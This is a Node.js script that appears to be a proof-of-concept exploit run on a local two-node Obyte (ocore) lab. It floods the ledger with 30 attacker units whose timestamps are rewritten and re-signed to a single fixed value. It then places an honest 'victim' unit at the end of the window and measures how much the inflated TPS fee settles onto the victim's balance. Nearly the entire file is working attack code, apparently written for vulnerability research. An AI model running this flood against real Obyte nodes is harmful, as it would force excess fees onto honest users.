// E2-4 — F4 flood end-to-end on the two-node lab (retry E1-9)
// Real path: hub composes units (real composer) -> post-edits timestamps (re-sign real) ->
// relays over the REAL relay protocol -> node validates/saves/stabilizes (real) ->
// settlement (updateTpsFees) runs at stabilization -> measure tps_fees_balances + actual_tps_fee.
// ROLE=hub PORT=6611 NODE_PORT=6612 : attacker flood + victim unit + witness waypoints
// ROLE=node PORT=6612              : receives + stabilizes + settles; measures + exits
"use strict";
const path = require("path");
const crypto = require("crypto");
const WebSocket = require("/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore/node_modules/ws");
const { boot, keys, defOf, signHash, sleep, TOTAL, O_CORE } = require("./e17b-boot.js");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");

const ROLE = process.env.ROLE || "hub";
const PORT = parseInt(process.env.PORT || (ROLE === "hub" ? 6611 : 6612), 10);
const NODE_PORT = parseInt(process.env.NODE_PORT || 6612, 10);
const DATA = path.join(__dirname, ".e17f-" + ROLE);

// victim: deterministic third key
function fixedKey(seed) {
	let priv = Buffer.from(seed, "hex");
	if (!ecdsa.privateKeyVerify(priv)) priv = crypto.createHash("sha256").update(seed).digest();
	return { priv: priv.toString("hex"), pub: Buffer.from(ecdsa.publicKeyCreate(priv, true)).toString("base64") };
}
const KEY_VICTIM = "3333333333333333333333333333333333333333333333333333333333333333";
const keysVictim = fixedKey(KEY_VICTIM);

function dumpUnits(ctx, tag) {
	return ctx.query("SELECT unit, level, main_chain_index, is_stable, sequence, is_on_main_chain, witnessed_level, actual_tps_fee, tps_fee FROM units ORDER BY main_chain_index").then(rows => {
		console.log("[" + tag + "] UNITS:", JSON.stringify(rows.map(r => ({ mci: r.main_chain_index, seq: r.sequence, st: r.is_stable, tps_fee: r.tps_fee, actual: r.actual_tps_fee }))));
		return ctx.query("SELECT address, mci, tps_fees_balance FROM tps_fees_balances ORDER BY address, mci").then(bal => {
			console.log("[" + tag + "] BALANCES:", JSON.stringify(bal));
			return rows;
		});
	});
}

function openRelayClient(url) {
	return new Promise((resolve, reject) => {
		const ws = new WebSocket(url, { maxPayload: 6 * 1024 * 1024 });
		const timer = setTimeout(() => reject(new Error("ws connect timeout to " + url)), 8000);
		ws.on("error", (e) => { clearTimeout(timer); reject(new Error("ws error: " + e)); });
		ws.on("open", () => {
			clearTimeout(timer);
			ws.send(JSON.stringify(["justsaying", { subject: "version", body: {
				protocol_version: "4.0", alt: "1", library: "ocore", library_version: "0.4.6",
				program: "e17f-lab", program_version: "0.0.1",
			} }]));
			ws.send(JSON.stringify(["request", { tag: "sub-e17f", command: "subscribe", params: {
				subscription_id: "e17f-sub", last_mci: 0, library_version: "0.4.6",
			} }]));
			console.log("[hub-ws] handshake sent to", url);
			setTimeout(() => resolve(ws), 800);
		});
	});
}

function sendJoint(ws, joint) {
	if (ws.readyState === 1) { ws.send(JSON.stringify(["justsaying", { subject: "joint", body: joint }])); return true; }
	return false;
}

// re-sign a composed unit after a timestamp edit (timestamp is in the signed stripped unit)
function retimestamp(joint, ts, key) {
	const objectHashLib = require(O_CORE + "/object_hash.js");
	const unit = joint.unit;
	unit.timestamp = ts;
	unit.authors[0].authentifiers.r = signHash(objectHashLib.getUnitHashToSign(unit), key.priv);
	unit.unit = objectHashLib.getUnitHash(unit);
	return joint;
}

async function main() {
	const ctx = await boot(DATA, PORT, { bServeAsHub: ROLE === "hub" });
	console.log("[" + ROLE + "] booted port", PORT, "genesis", ctx.genesis.unit.slice(0, 12) + "...");
	const objectHashLib = require(O_CORE + "/object_hash.js");

	// mainnet fee curve: tps_interval=1 (the lab default is 60)
	await ctx.query("UPDATE system_vars SET value='1' WHERE subject='tps_interval'");

	if (ROLE === "node") {
		console.log("[node] listening on", PORT, "- waiting for the flood...");
		for (let i = 0; i < 120; i++) {
			await sleep(1000);
			const rows = await ctx.query("SELECT COUNT(*) AS c FROM units WHERE is_stable=1");
			if (rows[0].c >= 10) { console.log("[node] observed >=10 stable units"); break; }
		}
		await sleep(4000); // let settlement finish
		await dumpUnits(ctx, "node-final");
		// per-unit settlement fees
		const fees = await ctx.query("SELECT unit, actual_tps_fee FROM units WHERE actual_tps_fee IS NOT NULL AND actual_tps_fee > 0 ORDER BY main_chain_index");
		console.log("[node] SETTLEMENT-FEES:", JSON.stringify(fees));
		const victim = objectHashLib.getChash160(defOf(keysVictim));
		const vbal = await ctx.query("SELECT tps_fees_balance FROM tps_fees_balances WHERE address=? ORDER BY mci DESC LIMIT 1", [victim]);
		console.log("[node] VICTIM-BALANCE:", JSON.stringify(vbal));
		console.log("NODE-DONE");
		process.exit(0);
	}

	// ===== HUB =====
	const victim_addr = objectHashLib.getChash160(defOf(keysVictim));
	const SIG_LEN = require(O_CORE + "/constants.js").SIG_LENGTH;
	function makeSignerFor(key) {
		return {
			readDefinition: (conn, address, cb) => cb(null, defOf(key)),
			readSigningPaths: (conn, address, cb) => cb({ r: SIG_LEN }),
			readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
		};
	}
	const userSigner = makeSignerFor(keys.user);
	const victimSigner = makeSignerFor(keysVictim);

	// custom compose with a real output (fund the victim) — real composer path
	function composePayment(fromAddr, fromKey, signer, outputs, messages, label) {
		return new Promise((resolve, reject) => {
			ctx.composer.composeJoint({
				paying_addresses: [fromAddr],
				signing_addresses: [fromAddr],
				outputs,
				messages: messages || [{ app: "text", payload_location: "inline", payload: label }],
				signer,
				callbacks: {
					ifOk: (joint, assocPrivatePayloads, unlock) => { unlock(); resolve(joint); },
					ifError: (e) => reject(new Error(label + " compose error: " + JSON.stringify(e).slice(0, 250))),
					ifNotEnoughFunds: (e) => reject(new Error(label + " not enough funds: " + e)),
				},
			});
		});
	}

	await sleep(3000);
	const ws = await openRelayClient("ws://127.0.0.1:" + NODE_PORT);

	// 1) waypoint W0 FIRST (witness) — the flood units reference it for witnessed level
	const w0 = await ctx.composeUnit(keys.witness, ctx.witness_addr, "W0");
	await ctx.validateAndSave(w0, "W0");
	sendJoint(ws, w0);
	await sleep(1500);
	console.log("[hub] W0 relayed");

	// the fixed timestamp for the flood window = W0's timestamp -> elapsed=0 -> ||1
	const T_FIX = w0.unit.timestamp;
	console.log("[hub] flood timestamp fixed to", T_FIX);

	// 2) fund the victim (attacker -> victim 1e12 base) — references W0 -> wl >= majority
	const fund = await composePayment(ctx.user_addr, keys.user, userSigner, [{ address: victim_addr, amount: 1e12 }, { address: ctx.user_addr, amount: 0 }], undefined, "FUND");
	retimestamp(fund, T_FIX, keys.user);
	await ctx.validateAndSave(fund, "FUND");
	sendJoint(ws, fund);
	console.log("[hub] funded victim");
	await sleep(800);

	// 3) the flood: 30 attacker units, timestamp = T_FIX, each relayed after local save
	const N_FLOOD = 30;
	const floodUnits = [];
	for (let i = 1; i <= N_FLOOD; i++) {
		const joint = await ctx.composeUnit(keys.user, ctx.user_addr, "F" + i);
		retimestamp(joint, T_FIX, keys.user);
		try {
			await ctx.validateAndSave(joint, "F" + i);
		} catch (e) {
			console.log("[hub] F" + i + " rejected: " + e.message.slice(0, 120));
			// transient fee gate: re-compose with the current (higher) estimate and retry once
			const joint2 = await ctx.composeUnit(keys.user, ctx.user_addr, "F" + i + "r");
			retimestamp(joint2, T_FIX, keys.user);
			try { await ctx.validateAndSave(joint2, "F" + i + "r"); floodUnits.push(joint2); sendJoint(ws, joint2); console.log("[hub] F" + i + " retried OK"); continue; }
			catch (e2) { console.log("[hub] F" + i + " retry also rejected: " + e2.message.slice(0, 120)); break; }
		}
		floodUnits.push(joint);
		sendJoint(ws, joint);
		console.log("[hub] relayed F" + i);
	}
	console.log("[hub] flood saved+relayed:", floodUnits.length, "units");

	// 4) the honest victim's unit at the tail of the window (settles with the flood rate)
	if (floodUnits.length >= 8) {
		try {
			const v = await composePayment(victim_addr, keysVictim, victimSigner, [{ address: victim_addr, amount: 0 }], undefined, "VICTIM-TAIL");
			retimestamp(v, T_FIX, keysVictim);
			await ctx.validateAndSave(v, "VICTIM-TAIL");
			sendJoint(ws, v);
			console.log("[hub] victim tail unit relayed");
		} catch (e) {
			console.log("[hub] victim tail rejected:", e.message.slice(0, 150));
		}
	} else {
		console.log("[hub] flood too short; skipping victim tail");
	}

	// 5) waypoint W1 to stabilize the flood
	const w1 = await ctx.composeUnit(keys.witness, ctx.witness_addr, "W1");
	await ctx.validateAndSave(w1, "W1");
	sendJoint(ws, w1);
	console.log("[hub] W1 relayed");

	await sleep(8000);
	await dumpUnits(ctx, "hub-final");
	console.log("HUB-DONE flood=" + floodUnits.length);
	process.exit(0);
}

main().catch(e => { console.error(ROLE + "-ERR:", e); process.exit(2); });
